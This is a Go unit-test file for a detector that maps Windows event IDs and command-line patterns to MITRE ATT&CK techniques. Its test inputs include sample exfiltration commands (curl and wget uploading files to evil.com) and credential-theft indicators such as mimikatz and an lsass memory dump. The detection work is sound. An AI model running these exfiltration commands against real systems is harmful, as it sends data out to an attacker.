package attck

import (
	"testing"
)

func TestEventIDMapping(t *testing.T) {
	tests := []struct {
		eventID    string
		wantCount  int
		wantHasID  string
	}{
		{"4625", 1, "T1110"},
		{"4648", 1, "T1550"},
		{"4672", 1, "T1548"},
		{"4688", 1, "T1059"},
		{"4698", 1, "T1053"},
		{"4663", 1, "T1070"},
		{"4660", 1, "T1070.004"},
		{"4657", 1, "T1112"},
		{"4768", 1, "T1558"},
		{"4769", 1, "T1558"},
		{"5156", 1, "T1021"},
		{"1074", 1, "T1562"},
		{"7045", 1, "T1053"},
		{"7036", 1, "T1562"},
		{"4626", 1, "T1087"},
		{"4634", 1, "T1110"},
	}

	for _, tt := range tests {
		t.Run("EventID_"+tt.eventID, func(t *testing.T) {
			techniques := MapEventByEventID(tt.eventID)
			if len(techniques) != tt.wantCount {
				t.Errorf("EventID %s: got %d techniques, want %d", tt.eventID, len(techniques), tt.wantCount)
			}
			if len(techniques) > 0 && techniques[0].ID != tt.wantHasID {
				t.Errorf("EventID %s: got technique %s, want %s", tt.eventID, techniques[0].ID, tt.wantHasID)
			}
		})
	}
}

func TestPatternMatching(t *testing.T) {
	tests := []struct {
		name        string
		commandLine string
		processName string
		wantHasID   string
	}{
		{"mimikatz", "mimikatz.exe", "", "T1003"},
		{"kerberos ticket", "kerberos ticket request", "", "T1003"},
		{"lsass access", "lsass.exe memory dump", "", "T1003"},
		{"net user", "net user admin", "", "T1087"},
		{"net group", "net group domain admins", "", "T1087"},
		{"xcopy", "xcopy C:\\data \\\\server\\share", "", "T1005"},
		{"robocopy", "robocopy /mir C:\\data \\\\server\\share", "", "T1005"},
		{"curl upload", "curl -T file.txt http://evil.com/upload", "", "T1048"},
		{"wget post", "wget --post-file=data.txt http://evil.com", "", "T1048"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			techniques := MapEventByPatterns(tt.commandLine, tt.processName)
			if len(techniques) == 0 {
				t.Errorf("Pattern %s: no techniques matched", tt.name)
				return
			}
			found := false
			for _, tech := range techniques {
				if tech.ID == tt.wantHasID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Pattern %s: expected technique %s not found in %v", tt.name, tt.wantHasID, techniques)
			}
		})
	}
}

func TestMappingCoverage(t *testing.T) {
	all := AllTechniques()
	if len(all) < 10 {
		t.Errorf("AllTechniques() returned %d techniques, want >= 10", len(all))
	}
	t.Logf("Total unique techniques: %d", len(all))
}

func TestDeduplication(t *testing.T) {
	techniques := MapEventToTechniques("4625", "authentication", "mimikatz.exe", "lsass.exe")
	seen := make(map[string]bool)
	for _, tech := range techniques {
		if seen[tech.ID] {
			t.Errorf("Duplicate technique ID: %s", tech.ID)
		}
		seen[tech.ID] = true
	}
}

func TestUnknownEventID(t *testing.T) {
	techniques := MapEventByEventID("99999")
	if len(techniques) != 0 {
		t.Errorf("Unknown EventID: got %d techniques, want 0", len(techniques))
	}
}

func TestMapEventToTechniques_Combined(t *testing.T) {
	// Event ID 4625 maps to T1110, and "mimikatz" matches T1003
	techniques := MapEventToTechniques("4625", "authentication", "mimikatz.exe", "")
	if len(techniques) < 2 {
		t.Errorf("expected at least 2 techniques, got %d", len(techniques))
	}

	ids := make(map[string]bool)
	for _, tech := range techniques {
		ids[tech.ID] = true
	}
	if !ids["T1110"] {
		t.Error("expected T1110 from event ID")
	}
	if !ids["T1003"] {
		t.Error("expected T1003 from pattern")
	}
}

func TestMapEventToTechniques_EmptyInputs(t *testing.T) {
	techniques := MapEventToTechniques("", "", "", "")
	if len(techniques) != 0 {
		t.Errorf("expected 0 techniques for empty inputs, got %d", len(techniques))
	}
}

func TestMapEventToTechniques_UnknownEventID(t *testing.T) {
	techniques := MapEventToTechniques("99999", "", "", "")
	if len(techniques) != 0 {
		t.Errorf("expected 0 for unknown event ID, got %d", len(techniques))
	}
}

func TestMapEventByPatterns_EmptyInputs(t *testing.T) {
	techniques := MapEventByPatterns("", "")
	if len(techniques) != 0 {
		t.Errorf("expected 0 for empty inputs, got %d", len(techniques))
	}
}

func TestMapEventByPatterns_NoMatch(t *testing.T) {
	techniques := MapEventByPatterns("hello world", "notepad.exe")
	if len(techniques) != 0 {
		t.Errorf("expected 0 for no match, got %d", len(techniques))
	}
}

func TestAllTechniques(t *testing.T) {
	all := AllTechniques()
	if len(all) < 15 {
		t.Errorf("AllTechniques() returned %d, want >= 15", len(all))
	}

	// Check uniqueness
	seen := make(map[string]bool)
	for _, tech := range all {
		if seen[tech.ID] {
			t.Errorf("duplicate technique: %s", tech.ID)
		}
		seen[tech.ID] = true
	}
}

func TestTechniqueIDs(t *testing.T) {
	techniques := []Technique{
		{ID: "T1110", Name: "Brute Force"},
		{ID: "T1059", Name: "Command and Scripting Interpreter"},
	}

	result := TechniqueIDs(techniques)
	if result != "T1110,T1059" {
		t.Errorf("expected 'T1110,T1059', got '%s'", result)
	}
}

func TestTechniqueIDs_Empty(t *testing.T) {
	result := TechniqueIDs(nil)
	if result != "" {
		t.Errorf("expected empty string, got '%s'", result)
	}
}

func TestTechniqueIDs_Single(t *testing.T) {
	techniques := []Technique{{ID: "T1110"}}
	result := TechniqueIDs(techniques)
	if result != "T1110" {
		t.Errorf("expected 'T1110', got '%s'", result)
	}
}

func TestTechniqueNames(t *testing.T) {
	techniques := []Technique{
		{ID: "T1110", Name: "Brute Force"},
		{ID: "T1059", Name: "Command and Scripting Interpreter"},
	}

	result := TechniqueNames(techniques)
	if result != "Brute Force,Command and Scripting Interpreter" {
		t.Errorf("unexpected: '%s'", result)
	}
}

func TestTechniqueNames_Empty(t *testing.T) {
	result := TechniqueNames(nil)
	if result != "" {
		t.Errorf("expected empty string, got '%s'", result)
	}
}

func TestTacticNames(t *testing.T) {
	techniques := []Technique{
		{ID: "T1110", Tactic: "credential-access"},
		{ID: "T1059", Tactic: "execution"},
		{ID: "T1053", Tactic: "persistence"},
	}

	result := TacticNames(techniques)
	if result != "credential-access,execution,persistence" {
		t.Errorf("unexpected: '%s'", result)
	}
}

func TestTacticNames_Deduplication(t *testing.T) {
	techniques := []Technique{
		{ID: "T1110", Tactic: "credential-access"},
		{ID: "T1550", Tactic: "credential-access"},
		{ID: "T1059", Tactic: "execution"},
	}

	result := TacticNames(techniques)
	if result != "credential-access,execution" {
		t.Errorf("expected deduped tactics, got '%s'", result)
	}
}

func TestTacticNames_Empty(t *testing.T) {
	result := TacticNames(nil)
	if result != "" {
		t.Errorf("expected empty string, got '%s'", result)
	}
}

func TestTechniqueURLs(t *testing.T) {
	techniques := MapEventByEventID("4625")
	if len(techniques) == 0 {
		t.Fatal("expected at least 1 technique")
	}
	if techniques[0].URL == "" {
		t.Error("expected non-empty URL")
	}
}

func TestPatternMatching_DnsQuery(t *testing.T) {
	techniques := MapEventByPatterns("", "nslookup.exe")
	// nslookup doesn't match any pattern
	if len(techniques) != 0 {
		t.Errorf("expected 0 for nslookup, got %d", len(techniques))
	}
}

func TestPatternMatching_CombinedMatch(t *testing.T) {
	// "net user" matches T1087, and "mimikatz" matches T1003
	techniques := MapEventByPatterns("net user admin mimikatz", "")
	if len(techniques) < 2 {
		t.Errorf("expected at least 2 matches, got %d", len(techniques))
	}

	ids := make(map[string]bool)
	for _, tech := range techniques {
		ids[tech.ID] = true
	}
	if !ids["T1087"] {
		t.Error("expected T1087")
	}
	if !ids["T1003"] {
		t.Error("expected T1003")
	}
}

func TestTechniqueTacticNotEmpty(t *testing.T) {
	all := AllTechniques()
	for _, tech := range all {
		if tech.Tactic == "" {
			t.Errorf("technique %s has empty tactic", tech.ID)
		}
	}
}
